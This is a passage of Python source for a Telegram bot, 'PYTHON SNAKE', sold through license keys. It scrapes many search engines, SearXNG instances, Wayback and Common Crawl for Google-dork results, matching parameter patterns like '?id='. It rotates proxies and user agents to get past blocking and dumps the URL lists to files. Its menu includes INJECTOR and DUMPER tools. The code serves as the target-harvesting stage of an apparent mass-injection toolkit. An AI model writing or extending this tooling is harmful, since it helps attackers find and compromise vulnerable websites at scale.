                "yandex", "qwant", "ecosia", "google", "marginalia", "searx"]
ENGINE_MISS = {}      # engine -> consecutive empty/blocked count

# ── SearXNG — public instances (searx.space se khud update hote hain) ────────
SEARX_FALLBACK = [
    "https://searx.be", "https://baresearch.org", "https://search.inetol.net",
    "https://priv.au", "https://searxng.site", "https://search.bus-hit.me",
    "https://searx.tiekoetter.com", "https://opnxng.com", "https://search.sapti.me",
    "https://paulgo.io", "https://searx.work", "https://search.hbubli.cc",
]
SEARX_INSTANCES = {"t": 0.0, "list": []}


async def searx_instances(force: bool = False) -> list:
    """searx.space/data/instances.json se chalti-phirti instances."""
    now = time.time()
    if not force and SEARX_INSTANCES["list"] and (now - SEARX_INSTANCES["t"] < 6 * 3600):
        return SEARX_INSTANCES["list"]
    # disk cache
    if not force:
        d = jload("searx_instances", {})
        if d.get("list") and (now - float(d.get("t") or 0) < 24 * 3600):
            SEARX_INSTANCES.update({"t": float(d.get("t") or 0), "list": d["list"]})
            return d["list"]
    good = []
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://searx.space/data/instances.json",
                             headers=UA, ssl=False,
                             timeout=aiohttp.ClientTimeout(total=20)) as r:
                if r.status == 200:
                    j = await r.json(content_type=None)
                    for base, meta in (j.get("instances") or {}).items():
                        try:
                            http = meta.get("http") or {}
                            search = (meta.get("timing") or {}).get("search") or {}
                            if http.get("status_code") != 200:
                                continue
                            if float(search.get("success_percentage") or 0) < 70:
                                continue
                            if (meta.get("network_type") or "normal") != "normal":
                                continue
                            good.append(base.rstrip("/"))
                        except Exception:
                            continue
    except Exception:
        good = []
    if not good:
        good = list(SEARX_FALLBACK)
    good = _uniq(good)[:30]
    SEARX_INSTANCES.update({"t": now, "list": good})
    jsave("searx_instances", {"t": now, "list": good})
    return good


async def fetch_sxng(session, dork: str, page: int = 1, proxy=None,
                     timeout: float = 12.0) -> list:
    """SearXNG se results — pehle JSON, phir HTML fallback. Instance rotate."""
    inst = await searx_instances()
    random.shuffle(inst)
    for base in inst[:3]:
        for fmt in ("json", "html"):
            url = "%s/search?q=%s&pageno=%d&language=en&safesearch=0" % (
                base, quote_plus(dork), max(1, page))
            if fmt == "json":
                url += "&format=json"
            kw = {"headers": UA, "timeout": aiohttp.ClientTimeout(total=timeout),
                  "ssl": False, "allow_redirects": True}
            if proxy:
                kw["proxy"] = proxy
            try:
                async with session.get(url, **kw) as r:
                    if r.status != 200:
                        continue
                    body = await r.text(errors="ignore")
                    if not body:
                        continue
                    urls = extract_urls("sxng", body)
                    if urls:
                        return urls
            except Exception:
                continue
    return []


TRACK_PARAMS = {
    "srsltid", "gclid", "dclid", "gbraid", "wbraid", "fbclid", "msclkid",
    "yclid", "twclid", "igshid", "ttclid", "li_fat_id",
    "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
    "utm_id", "utm_name", "utm_reader", "utm_brand", "utm_social",
    "mc_cid", "mc_eid", "ref_src", "_ga", "_gl", "spm", "scm",
}


def _strip_track(query: str) -> str:
    """srsltid/gclid/utm_* jaise tracking params hatao (dedupe saaf rahe)."""
    if not query:
        return ""
    keep = []
    for part in query.split("&"):
        if not part:
            continue
        k = part.split("=", 1)[0].lower()
        if k in TRACK_PARAMS:
            continue
        keep.append(part)
    return "&".join(keep)


def _clean_url(u: str) -> str:
    u = _html.unescape(u or "").strip().strip('"\'')
    if u.startswith("//"):
        u = "https:" + u
    if not u.startswith("http"):
        return ""
    try:
        p = urlparse(u)
        host = (p.hostname or "").lower()
        if not host:
            return ""
        base = ".".join(host.split(".")[-2:]) if host.count(".") >= 1 else host
        if host in JUNK_HOSTS or base in JUNK_HOSTS:
            return ""
        path = (p.path or "").lower()
        for e in JUNK_EXT:
            if path.endswith(e):
                return ""
        if len(u) > 500:
            return ""
        q2 = _strip_track(p.query or "")
        return "%s://%s%s%s" % (p.scheme or "http", host, p.path,
                                ("?" + q2) if q2 else "")
    except Exception:
        return ""


def extract_urls(engine: str, body: str) -> list:
    """Engine ke HTML se result URLs nikaalo."""
    out = []
    if engine == "ddg":
        for m in re.finditer(r'uddg=([A-Za-z0-9%._~\-]+)', body):
            out.append(unquote(m.group(1)))
        for m in re.finditer(r'class="result__a"[^>]+href="([^"]+)"', body):
            out.append(_html.unescape(m.group(1)))
    elif engine == "bing":
        for m in re.finditer(r'<h2[^>]*>\s*<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'<cite[^>]*>(.*?)</cite>', body, re.S):
            out.append(re.sub(r"<[^>]+>", "", m.group(1)))
    elif engine == "mojeek":
        for m in re.finditer(r'<a[^>]+class="[^"]*\bob\b[^"]*"[^>]+href="([^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]*class="[^"]*ob[^"]*"', body):
            out.append(m.group(1))
    elif engine in ("yahoo", "startpage", "brave", "google"):
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'/url\?q=(https?%3A[^&"]+)', body):
            out.append(unquote(m.group(1)))
    elif engine == "searx":
        try:
            j = json.loads(body)
            for r in (j.get("results") or []):
                out.append(str(r.get("url") or ""))
        except Exception:
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
                out.append(m.group(1))
    elif engine == "sxng":
        # JSON API
        ok_json = False
        try:
            j = json.loads(body)
            ok_json = True
            for r in (j.get("results") or []):
                out.append(str(r.get("url") or ""))
        except Exception:
            pass
        if not ok_json:
            # HTML — searxng result links <a class="url_header" href=...> / h3 a
            for m in re.finditer(r'<a[^>]+class="[^"]*url_header[^"]*"[^>]+href="([^"]+)"', body):
                out.append(m.group(1))
            for m in re.finditer(r'<h3>\s*<a[^>]+href="(https?://[^"]+)"', body):
                out.append(m.group(1))
            for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"[^>]+rel="noreferrer"', body):
                out.append(m.group(1))
    elif engine == "yandex":
        for m in re.finditer(r'<a[^>]+class="[^"]*Link[^"]*"[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
        for m in re.finditer(r'href="(https?://[^"]+)"[^>]*target="_blank"', body):
            out.append(m.group(1))
    elif engine in ("qwant", "ecosia", "marginalia"):
        for m in re.finditer(r'<a[^>]+href="(https?://[^"]+)"', body):
            out.append(m.group(1))
    return _uniq([x for x in (_clean_url(u) for u in out) if x])


async def fetch_engine(session, engine: str, dork: str, proxy=None,
                       timeout: float = 15.0, page: int = 0) -> list:
    if engine == "sxng":
        return await fetch_sxng(session, dork, page=max(1, page + 1), proxy=proxy, timeout=timeout)
    url = ENGINE_URLS.get(engine)
    if not url:
        return []
    base, step = ENGINE_PAGE.get(engine, (0, 10))
    try:
        target = url.format(q=quote_plus(dork), p=base + int(page) * step)
    except Exception:
        target = url.format(q=quote_plus(dork))
    hdrs = dict(UA)
    hdrs["Referer"] = "https://www.google.com/"
    kw = {"headers": hdrs, "timeout": aiohttp.ClientTimeout(total=timeout),
          "ssl": False, "allow_redirects": True}
    if proxy:
        kw["proxy"] = proxy
    for attempt in (1, 2):
        try:
            async with session.get(target, **kw) as r:
                if r.status != 200:
                    if r.status in (403, 429, 503):
                        ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1
                    return []
                body = await r.text(errors="ignore")
                if not body:
                    return []
                urls = extract_urls(engine, body)
                if not urls:
                    ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1
                return urls
        except Exception:
            if attempt == 2:
                ENGINE_MISS[engine] = ENGINE_MISS.get(engine, 0) + 1
                return []
            await asyncio.sleep(0.15)


async def wayback_urls(domain: str, limit: int = 300, proxy=None) -> list:
    """Wayback CDX — captcha nahi, site: dork ke liye best."""
    url = ("http://web.archive.org/cdx/search/cdx?url=%s/*&output=json&fl=original"
           "&collapse=urlkey&limit=%d&filter=statuscode:200" % (quote_plus(domain), limit))
    try:
        kw = {"timeout": aiohttp.ClientTimeout(total=25), "ssl": False, "headers": UA}
        if proxy:
            kw["proxy"] = proxy
        async with aiohttp.ClientSession() as s:
            async with s.get(url, **kw) as r:
                if r.status != 200:
                    return []
                txt = await r.text(errors="ignore")
        rows = json.loads(txt)
        return _uniq([_clean_url(x[0]) for x in rows[1:] if x and _clean_url(x[0])])
    except Exception:
        return []


_STRICT_INURL = re.compile(r'(?:inurl|allinurl):\s*\(?"?([^"\s)]+)', re.I)
_STRICT_EXT = re.compile(r'(?:filetype|ext):\s*\(?"?([a-z0-9]{2,6})', re.I)


def dork_match(url: str, dork: str) -> bool:
    """URL ko dork ke inurl / filetype constraints se match karta hai.

    intitle / intext verify nahi ho sakte (page fetch chahiye) — unhe skip
    karte hain. OR (|) wale dork pe bhi skip.
    """
    if not url or not dork:
        return True
    if "|" in dork:
        return True
    low = url.lower()
    path = low.split("?")[0]
    ok = True

    inurls = _STRICT_INURL.findall(dork)
    for pat in inurls:
        pat = pat.strip().lower()
        if not pat:
            continue
        if pat in low:
            continue
        # '?id=' jaisa pattern — query me bas key check karo
        if "=" in pat and "?" in pat:
            key = pat.split("=")[0].split("?")[-1]
            if key and (("?" + key + "=") in low or ("&" + key + "=") in low):
                continue
        return False

    exts = _STRICT_EXT.findall(dork)
    for e in exts:
        e = e.lower()
        if path.endswith("." + e):
            continue
        if ("." + e + "/") in path or ("." + e + "?") in low:
            continue
        # sub-path me extension ho sakta hai
        if ("." + e) in path:
            continue
        return False
    return ok


# ── COMMON CRAWL CDX — 100% free, koi API key nahi ───────────────────────────
CC_CACHE = {"t": 0.0, "api": ""}


async def cc_index(session) -> str:
    """Latest Common Crawl index endpoint (collinfo.json se)."""
    if CC_CACHE["api"] and (time.time() - CC_CACHE["t"] < 86400):
        return CC_CACHE["api"]
    d = jload("cc_index", {})
    if d.get("api") and (time.time() - float(d.get("t") or 0) < 86400):
        CC_CACHE.update({"t": float(d["t"]), "api": d["api"]})
        return d["api"]
    try:
        async with session.get("https://index.commoncrawl.org/collinfo.json",
                               headers=UA, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status == 200:
                j = await r.json(content_type=None)
                if isinstance(j, list) and j:
                    api = str(j[0].get("cdx-api") or "")
                    if api:
                        CC_CACHE.update({"t": time.time(), "api": api})
                        jsave("cc_index", {"t": time.time(), "api": api})
                        return api
    except Exception:
        pass
    return ""


async def cc_urls(domain: str, limit: int = 500, proxy=None) -> list:
    """Common Crawl se ek domain ke URLs — free, unlimited-ish, koi key nahi."""
    domain = (domain or "").strip().lower().lstrip(".")
    if not domain:
        return []
    limit = max(10, min(5000, int(limit or 500)))
    conn = aiohttp.TCPConnector(limit=8, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        api = await cc_index(session)
        if not api:
            return []
        kw = {"params": {"url": "%s/*" % domain, "output": "json", "limit": str(limit),
                         "fl": "url", "filter": "=status:200",
                         "collapse": "urlkey"},
              "headers": UA, "ssl": False,
              "timeout": aiohttp.ClientTimeout(total=45)}
        if proxy:
            kw["proxy"] = proxy
        try:
            async with session.get(api, **kw) as r:
                if r.status != 200:
                    return []
                txt = await r.text(errors="ignore")
        except Exception:
            return []
    out = []
    for line in txt.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
            u = str(o.get("url") or "")
        except Exception:
            continue
        cu = _clean_url(u)
        if cu:
            out.append(cu)
    return _uniq(out)


def domains_from_dorks(dorks: list) -> list:
    """site:example.com wale dorks se domain nikaalo (CDX ke liye)."""
    out = []
    for d in dorks or []:
        for m in re.finditer(r"site:\s*([a-z0-9.-]+\.[a-z]{2,})", str(d), re.I):
            out.append(m.group(1).lower())
    return _uniq(out)


# ── optional paid/free API keys (Google CSE / SerpAPI) ───────────────────────
def api_keys() -> dict:
    return {
        "cse_key": str(sget("cse_key") or ""),
        "cse_cx": str(sget("cse_cx") or ""),
        "serpapi": str(sget("serpapi") or ""),
    }


async def cse_search(session, dork: str, num: int = 10, start: int = 1) -> list:
    """Google Custom Search JSON API — 100 queries/day FREE (key + cx chahiye)."""
    k = api_keys()
    if not (k["cse_key"] and k["cse_cx"]):
        return []
    try:
        async with session.get(
                "https://www.googleapis.com/customsearch/v1",
                params={"key": k["cse_key"], "cx": k["cse_cx"], "q": dork,
                        "num": min(10, num), "start": start},
                headers=UA, ssl=False,
                timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status != 200:
                return []
            j = await r.json(content_type=None)
        out = [str(it.get("link") or "") for it in (j.get("items") or [])]
        return _uniq([u for u in (_clean_url(x) for x in out) if u])
    except Exception:
        return []


# ── GOOGLE via ijerm (koi API key nahi, free) ────────────────────────────────
GJ_DEFAULT = "https://ijerm.com/submit_article/book1/search-api"
GJ_STATE = {"fail": 0, "ok": 0, "last": 0.0, "dead_until": 0.0}
GJ_LOCK = None
GJ_MIN_GAP = 2.5          # requests ke beech minimum gap (sec) — endpoint ko izzat do
GJ_MAX_PAGES = 6          # 10+ pages pe endpoint timeout karta hai
GJ_JUNK_HOSTS = {
    "exploit-db.com", "www.exploit-db.com", "github.com", "www.github.com",
    "scribd.com", "www.scribd.com", "stackoverflow.com", "stackexchange.com",
    "www.youtube.com", "youtube.com", "reddit.com", "www.reddit.com",
    "medium.com", "qiita.com", "note.com", "habr.com", "blog.51cto.com",
    "facebook.com", "www.facebook.com", "twitter.com", "x.com",
    "wordpress.org", "www.hostinger.com", "elementor.com",
}


def gj_enabled() -> bool:
    v = str(sget("gj_url", "") or "").strip()
    return v != "-"


def gj_base() -> str:
    v = str(sget("gj_url", "") or "").strip()
    return v if (v and v != "-" and v.startswith("http")) else GJ_DEFAULT


def gj_alive() -> bool:
    return time.time() >= GJ_STATE["dead_until"]


def gj_host_junk(url: str) -> bool:
    try:
        host = url.split("//", 1)[-1].split("/", 1)[0].lower().split(":")[0]
    except Exception:
        return False
    if host.startswith("www."):
        host = host
    return host in GJ_JUNK_HOSTS or host.removeprefix("www.") in GJ_JUNK_HOSTS


async def gjerm_search(session, dork: str, pages: int = 1) -> list:
    """ijerm ka free Google endpoint — koi key nahi. Rate-limited + circuit breaker."""
    global GJ_LOCK
    dork = (dork or "").strip()
    if not dork or not gj_enabled() or not gj_alive():
        return []
    if GJ_LOCK is None:
        GJ_LOCK = asyncio.Lock()
    st = GJ_STATE
    async with GJ_LOCK:
        gap = GJ_MIN_GAP - (time.time() - st["last"])
        if gap > 0:
            await asyncio.sleep(min(gap, 6))
        pages = max(1, min(GJ_MAX_PAGES, int(pages or 1)))
        try:
            async with session.get(
                    gj_base(),
                    params={"q": dork, "pages": pages},
                    headers={"User-Agent": random.choice(UA_LIST),
                             "Accept": "application/json"},
                    ssl=False, allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=45)) as r:
                st["last"] = time.time()
                if r.status != 200:
                    st["fail"] += 1
                    if st["fail"] >= 3:
                        st["dead_until"] = time.time() + 300
                        logger.warning("gjerm: 3 fail — 5 min ke liye band")
                    return []
                j = await r.json(content_type=None)
        except Exception as exc:
            st["last"] = time.time()
            st["fail"] += 1
            if st["fail"] >= 3:
                st["dead_until"] = time.time() + 300
                logger.warning("gjerm fail (%s) — 5 min band", str(exc)[:60])
            return []
    if not isinstance(j, dict) or j.get("status") == "error":
        st["fail"] += 1
        return []
    st["ok"] += 1
    st["fail"] = 0
    out = []
    for u in (j.get("urls") or []):
        cu = _clean_url(str(u))
        if not cu or gj_host_junk(cu):
            continue
        out.append(cu)
    return _uniq(out)


async def serpapi_search(session, dork: str, num: int = 20, start: int = 0) -> list:
    """SerpAPI — 100 searches/month free (real Google results + dorks)."""
    k = api_keys()
    if not k["serpapi"]:
        return []
    try:
        async with session.get(
                "https://serpapi.com/search.json",
                params={"engine": "google", "q": dork, "num": min(100, num),
                        "start": start, "api_key": k["serpapi"]},
                headers=UA, ssl=False,
                timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status != 200:
                return []
            j = await r.json(content_type=None)
        out = [str(it.get("link") or "") for it in (j.get("organic_results") or [])]
        return _uniq([u for u in (_clean_url(x) for x in out) if u])
    except Exception:
        return []


def _pick_proxy() -> str:
    pool = PROXIES or load_proxy_pool()
    if not pool:
        return None
    return random.choice(pool[: max(1, min(len(pool), 30))]).get("url")


async def parse(dorks: list, max_urls: int = 200, pages: int = 1, engines: list = None,
                use_proxy: bool = True, progress=None, strict: bool = True) -> dict:
    """Dork list → real URLs. Engine rotate + proxy rotate + 2 round retry."""
    engines = engines or ENGINE_ORDER
    max_urls = max(1, min(20000, int(max_urls or 200)))
    pages = max(1, min(20, int(pages or 1)))
    found = []
    seen = set()
    # chhoti dork list = zyada engines (depth), badi list = kam engines (speed)
    eng_cap = len(engines) if len(dorks) <= 10 else 3
    stats = {"queries": 0, "engine_hits": defaultdict(int), "errors": 0, "blocked": 0}
    conn = aiohttp.TCPConnector(limit=60, ssl=False, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=conn) as session:
        i = 0
        for dork in dorks:
            if len(found) >= max_urls:
                break
            for page in range(pages):
                if len(found) >= max_urls:
                    break
                q = dork
                got = 0
                tried = 0
                # free Google (ijerm) — page 0 pe hi, chhota budget
                if page == 0 and gj_enabled() and gj_alive() and len(found) < max_urls:
                    gurls = await gjerm_search(session, dork, pages=1)
                    if gurls:
                        stats["queries"] += 1
                        stats["engine_hits"]["gjerm"] += len(gurls)
                        fn = 0
                        for u in gurls:
                            if strict and not dork_match(u, dork):
                                continue
                            kk = u.split("#")[0]
                            if kk in seen:
                                continue
                            seen.add(kk)
                            found.append(kk)
                            fn += 1
                            if len(found) >= max_urls:
                                break
                        got += 1 if fn else 0
                order = list(engines)
                random.shuffle(order)
                # jo engine 3+ baar khaali/blocked nikla, use peeche bhejo
                order.sort(key=lambda e: ENGINE_MISS.get(e, 0) >= 3)
                for eng in order:
                    # 0-1 result pe kabhi give-up nahi — saare engines try karo
                    if tried >= eng_cap and got >= 2:
                        break
                    tried += 1
                    proxy = _pick_proxy() if use_proxy else None
                    urls = await fetch_engine(session, eng, q, proxy, page=page)
                    stats["queries"] += 1
                    if not urls:
                        stats["blocked"] += 1
                        continue
                    # strict: URL ko dork ke inurl/filetype se match karo
                    if strict:
                        matched = [u for u in urls if dork_match(u, dork)]
                        if matched:
                            urls = matched
                    stats["engine_hits"][eng] += len(urls)
                    for u in urls:
                        k = u.split("#")[0]
                        if k not in seen:
                            seen.add(k)
                            found.append(k)
                            got += 1
                        if len(found) >= max_urls:
                            break
                    if got >= 5 or len(found) >= max_urls:
                        break
            i += 1
            if progress and i % 3 == 0:
                try:
                    await progress({"dorks": i, "total": len(dorks), "urls": len(found)})
                except Exception:
                    pass
    return {"urls": found, "stats": stats}


# ── DEEP SCAN — sab dorks, poore stats (competitor jaisa card) ───────────────
async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                     use_proxy: bool = True, strict: bool = True,
                     progress=None) -> dict:
    """Har dork scan karo, junk hatao, aur poore stats do:

    scanned / raw / unique / errors / filtered / engines
    """
    dorks = [str(d).strip() for d in (dorks or []) if str(d).strip()]
    max_urls = max(10, min(100000, int(max_urls or 5000)))
    pages = max(1, min(10, int(pages or 1)))
    st = {"scanned": 0, "total": len(dorks), "raw": 0, "unique": 0,
          "errors": 0, "filtered": 0, "engine_hits": defaultdict(int),
          "junk": 0, "mismatch": 0, "cc": 0, "api": 0, "gj": 0}
    seen, out = set(), []

    # 1) site: dorks -> Common Crawl (free, bahut zyada URLs)
    doms = domains_from_dorks(dorks)
    if doms:
        for dom in doms[:8]:
            got = await cc_urls(dom, limit=min(2000, max_urls), proxy=None)
            st["raw"] += len(got)
            st["cc"] += len(got)
            for u in got:
                k = u.split("#")[0]
                if k not in seen:
                    seen.add(k)
                    out.append(k)
                    if len(out) >= max_urls:
                        break
            if len(out) >= max_urls:
                break

    # 2) FREE GOOGLE (ijerm) — koi key nahi, rate-limited
    k = api_keys()
    conn = aiohttp.TCPConnector(limit=60, ssl=False, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=conn) as session:
        # 2) optional API keys (agar user ne daale hain)
        if k["serpapi"] or (k["cse_key"] and k["cse_cx"]):
            for dork in dorks[:60]:
                got = []
                if k["serpapi"]:
                    got = await serpapi_search(session, dork, num=20)
                if not got and k["cse_key"] and k["cse_cx"]:
                    got = await cse_search(session, dork)
                st["raw"] += len(got)
                st["api"] += len(got)
                for u in got:
                    if not (strict and not dork_match(u, dork)):
                        kk = u.split("#")[0]
                        if kk not in seen:
                            seen.add(kk)
                            out.append(kk)

        # 3) saare dorks, saare engines — koi early stop nahi
        gj_budget = min(40, len(dorks))          # free Google ki limit (slow endpoint)
        gj_deadline = time.time() + 120
        for i, dork in enumerate(dorks, 1):
            st["scanned"] = i
            if len(out) >= max_urls:
                break
            # free Google — har dork pe page 0 se, budget khatam hone tak
            if (i <= gj_budget and gj_enabled() and gj_alive()
                    and time.time() < gj_deadline and len(out) < max_urls):
                gurls = await gjerm_search(session, dork, pages=min(2, pages))
                st["raw"] += len(gurls)
                st["gj"] += len(gurls)
                for u in gurls:
                    if strict and not dork_match(u, dork):
                        st["mismatch"] += 1
                        st["filtered"] += 1
                        continue
                    kk = u.split("#")[0]
                    if kk in seen:
                        st["junk"] += 1
                        st["filtered"] += 1
                        continue
                    seen.add(kk)
                    out.append(kk)
                    if len(out) >= max_urls:
                        break
            for page in range(pages):
                if len(out) >= max_urls:
                    break
                order = list(ENGINE_ORDER)
                random.shuffle(order)
                order.sort(key=lambda e: ENGINE_MISS.get(e, 0) >= 3)
                got_any = 0
                for eng in order[:4]:
                    proxy = _pick_proxy() if use_proxy else None
                    urls = await fetch_engine(session, eng, dork, proxy, page=page)
                    if not urls:
                        st["errors"] += 1
                        continue
                    st["engine_hits"][eng] += len(urls)
                    st["raw"] += len(urls)
                    got_any += 1
                    for u in urls:
                        if strict and not dork_match(u, dork):
                            st["mismatch"] += 1
                            st["filtered"] += 1
                            continue
                        kk = u.split("#")[0]
                        if kk in seen:
                            st["junk"] += 1
                            st["filtered"] += 1
                            continue
                        seen.add(kk)
                        out.append(kk)
                        if len(out) >= max_urls:
                            break
                    if got_any >= 2:
                        break
            if progress and (i % 2 == 0 or i == len(dorks)):
                try:
                    await progress(st)
                except Exception:
                    pass

    st["unique"] = len(out)
    st["filtered"] = max(st["filtered"], st["raw"] - st["unique"])
    return {"urls": out, "stats": st}


# ═══════════════════════════════════════════════════════════════════════════════
#  DUMPER — sab kuch file me
# ═══════════════════════════════════════════════════════════════════════════════
def dump_text(items, tag: str = "dump", header: str = "") -> tuple:
    """(path, count) — txt file banao."""
    items = [str(x) for x in (items or []) if str(x).strip()]
    name = "%s_%s.txt" % (re.sub(r"[^a-z0-9]+", "_", tag.lower())[:20] or "dump", stamp())
    path = os.path.join(DUMP_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        if header:
            f.write("# %s\n# %s\n\n" % (header, datetime.now().strftime("%d %b %Y %H:%M")))
        f.write("\n".join(items))
        f.write("\n")
    return path, len(items)


def dump_json(obj, tag: str = "dump") -> str:
    name = "%s_%s.json" % (re.sub(r"[^a-z0-9]+", "_", tag.lower())[:20] or "dump", stamp())
    path = os.path.join(DUMP_DIR, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, ensure_ascii=False, indent=1)
    return path


def dumps_list(limit: int = 12) -> list:
    try:
        files = [os.path.join(DUMP_DIR, f) for f in os.listdir(DUMP_DIR)]
        files = [f for f in files if os.path.isfile(f)]
        files.sort(key=os.path.getmtime, reverse=True)
        return files[:limit]
    except Exception:
        return []


async def send_file(update, path: str, caption: str = ""):
    try:
        with open(path, "rb") as f:
            await update.effective_message.reply_document(document=f,
                                                          filename=os.path.basename(path),
                                                          caption=caption[:1000])
        return True
    except Exception as exc:
        logger.warning("send_file fail: %s", exc)
        return False


# ═══════════════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════════════════════
def kb_main() -> InlineKeyboardMarkup:
    return RK([
        [InlineKeyboardButton("🔍 PARSER", callback_data="m:parse"),
         InlineKeyboardButton("🎯 DORKER", callback_data="m:dork")],
        [InlineKeyboardButton("🔑 HQ KEYWORDS", callback_data="m:kw"),
         InlineKeyboardButton("🔗 URL REVERSE", callback_data="m:rev")],
        [InlineKeyboardButton("💉 INJECTOR", callback_data="m:inj"),
         InlineKeyboardButton("📦 DUMPER", callback_data="m:dump")],
        [InlineKeyboardButton("🧅 PROXY ENGINE", callback_data="m:proxy"),
         InlineKeyboardButton("📊 QUALITY CHECK", callback_data="m:qa")],
        [InlineKeyboardButton("🎲 RANDOMIZER", callback_data="m:rand"),
         InlineKeyboardButton("📖 HELP", callback_data="m:help")],
    ])


def kb_back(to: str = "m:home") -> InlineKeyboardMarkup:
    return RK([[InlineKeyboardButton("⬅️ BACK", callback_data=to)]])


def main_text(name: str = "") -> str:
    c = db_counts()
    hi = ("✨ Hi <b>%s</b>,\n" % esc(name)) if name else ""
    return (H("PYTHON SNAKE", "%s • %s" % (VERSION, "sirf kaam ka")) + "\n"
            + hi + "\n"
            + tag("DATABASE") + "\n"
            + "◆ %s : <code>%s</code>\n" % (style("PAGE-TYPES", "btn"), fmt(c["page_types"]))
            + "◆ %s : <code>%s</code>\n" % (style("PARAMETERS", "btn"), fmt(c["parameters"]))
            + "◆ %s : <code>%s</code>\n" % (style("EXTENSIONS", "btn"), fmt(c["extensions"]))
            + "◆ %s      : <code>%s</code>\n" % (style("DORKS", "btn"), fmt(c["dorks"]))
            + "◆ %s   : <code>%s</code>\n\n" % (style("KEYWORDS", "btn"), fmt(c["keywords"]))
            + "👇 %s" % style("Tool chuno", "sub"))


# ═══════════════════════════════════════════════════════════════════════════════
#  ACCESS / CAPTCHA
# ═══════════════════════════════════════════════════════════════════════════════
def captcha_new(context):
    a, b = random.randint(2, 19), random.randint(2, 19)
    op = random.choice(["+", "-", "×"])
    ans = a + b if op == "+" else (a - b if op == "-" else a * b)
    opts = {ans}
    while len(opts) < 4:
        d = ans + random.choice((-6, -4, -3, -2, -1, 1, 2, 3, 4, 6))
        if d > 0:
            opts.add(d)
    opts = sorted(opts)
    random.shuffle(opts)
    try:
        context.user_data["cap"] = ans
    except Exception:
        pass
    q = (H("VERIFICATION") + "\n\nBot use karne se pehle ye solve karo:\n\n"
         "<b>%d %s %d = ?</b>" % (a, op, b))
    rows = [[InlineKeyboardButton(str(o), callback_data="cap:%d" % o) for o in opts[:2]],
            [InlineKeyboardButton(str(o), callback_data="cap:%d" % o) for o in opts[2:]]]
    rows.append([InlineKeyboardButton("🔄 Naya sawaal", callback_data="cap:new")])
    return q, RK(rows)


def access_ok(uid) -> bool:
    return is_admin(uid) or has_access(uid)


def is_verified(context, uid) -> bool:
    """Captcha ek baar — restart ke baad dobara nahi poochta."""
    if context.user_data.get("verified"):
        return True
    try:
        if USERS.get(str(uid), {}).get("verified"):
            context.user_data["verified"] = True
            return True
    except Exception:
        pass
    return False


def need_key_text(uid) -> str:
    return (H("ACCESS NEEDED", "license nahi hai") + "\n\n"
            "Aapki ID: <code>%s</code>\n\n"
            "<b>Key kaise redeem kare?</b>\n"
            "1️⃣ Neeche 🔑 <b>REDEEM KEY</b> dabao\n"
            "2️⃣ Key bhejo: <code>SNK-AB12-CD34</code>\n\n"
            "⚡ <b>Ya seedha:</b> <code>/redeem SNK-AB12-CD34</code>\n"
            "⚡ <b>Ya bas</b> key chat me paste kar do — khud redeem ho jayegi.\n\n"
            "Key nahi hai? Owner se lo: %s"
            % (uid, ADMIN_USERNAME))


def kb_needkey() -> InlineKeyboardMarkup:
    return RK([
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="m:redeem")],
        [InlineKeyboardButton("☎️ CONTACT OWNER", url="https://t.me/%s" % ADMIN_USERNAME.lstrip("@"))],
    ])


async def show_home(update, uid, edit: bool = True):
    touch_user(update) if update.effective_user else None
    txt = main_text(getattr(update.effective_user, "first_name", "") or "")
    if not access_ok(uid):
        try:
            if edit and update.callback_query:
                await update.callback_query.edit_message_text(need_key_text(uid),
                                                              reply_markup=kb_needkey())
            else:
                await update.effective_message.reply_text(need_key_text(uid),
                                                          reply_markup=kb_needkey())
        except Exception:
            pass
        return
    try:
        if edit and update.callback_query:
            await update.callback_query.edit_message_text(txt, reply_markup=kb_main(),
                                                          parse_mode=ParseMode.HTML)
        else:
            await update.effective_message.reply_text(txt, reply_markup=kb_main(),
                                                      parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    touch_user(update)
    if not is_verified(context, u.id):
        q, kb = captcha_new(context)
        await update.effective_message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    # /start SNK-XXXX-XXXX  (deep link)
    arg = (" ".join(getattr(context, "args", []) or [])).strip().upper()
    if arg and (KEY_RE.match(arg) or arg in KEYS) and not access_ok(u.id):
        return await input_redeem(update, context, arg)
    await show_home(update, u.id, edit=False)


async def cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    uid = u.id
    adm = "👑 Admin (unlimited)" if is_admin(uid) else (
        "✅ Licensed" if has_access(uid) else "⚪ No license — 🔑 REDEEM KEY dabao")
    txt = ("🪪 <b>%s</b>\n" % F("YOUR ID", T()["head"]) + T()["div"] + "\n"
           "ID       : <code>%d</code>\n"
           "Username : %s\n"
           "Status   : %s" % (uid, esc("@" + u.username if u.username else (u.first_name or "—")), adm))
    await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
